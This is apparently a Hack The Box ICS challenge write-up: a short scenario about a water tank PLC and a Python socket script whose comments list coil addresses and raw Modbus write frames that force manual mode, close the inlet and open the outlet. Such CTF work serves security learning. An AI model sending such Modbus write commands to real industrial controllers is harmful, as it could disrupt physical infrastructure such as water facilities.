<h2> This is an Easy Hack The Box challenge from the ICS category </h2>

<p> "Our infrastructure is under attack! The HMI interface went offline and we lost control of some critical PLCs in our ICS system. Moments after the attack started we managed to identify the target but did not have time to respond. The water storage facility's high/low sensors are corrupted thus setting the PLC into a halt state. We need to regain control and empty the water tank before it overflows. Our field operative has set a remote connection directly with the serial network of the system."</p>


```python
#! /bin/python
# https://www.modbustools.com/modbus.html#Function01

import socket

# COILS       Decimal     Hex
# in_valve    12          c
# out_valve   21          15
# start       33          21
# man_mo_co   9947        26db
# cutoff      5           5
# cutoff_in   26          1a
# fo_sta_out  52          34
# fo_sta_in   1336        538

# READ FROM COIL 12 ON DEVICE 82
# Coil Addr:    52
# Function:     01 (reading)
# Address Hi:   00
# Address Lo:   0C
# Quant Co Hi:  00
# Quant Co Lo:  01

# TURN ON MANUAL MODE:
# Coil Addr:    52
# Function:     05 (writing)
# Address Hi:   26
# Address Lo:   db
# Write Hi:     FF
# Write Lo:     00

# TURN ON MANUAL MODE:              520526dbFF00
# TURN ON CUTOFF_IN => STOP_IN:     5205001aFF00
# TURN ON FO_ST_OUT:                52050034FF00

SERVER_ADDRESS = "IP_ADDRESS:PORT".split(":")
SERVER_IP_PORT = (SERVER_ADDRESS[0], int(SERVER_ADDRESS[1]))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
    mysocket.connect(SERVER_IP_PORT)
    while True:
        payload = mysocket.recv(2048).decode('utf-8')
        if '3. Exit' in payload or 'Modbus command:' in payload:
            print("[+] ...")
            message = input('Command: ')
            mysocket.send(f"{message}\r\n".encode())
            if message == 'q':
                break
```
